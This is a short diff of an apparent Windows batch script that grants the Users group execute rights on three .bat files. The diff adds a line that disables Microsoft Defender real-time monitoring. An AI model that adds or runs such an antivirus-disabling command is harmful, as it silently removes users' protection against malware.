@@ -1,4 +1,5 @@
 Cls 
+Set-MpPreference -DisableRealtimeMonitoring $true
 icacls interservertk.bat /grant Users:(RX)
 icacls DkeyRegFiles.bat /grant Users:(RX) 
 icacls psychonotes.bat /grant Users:(RX) 
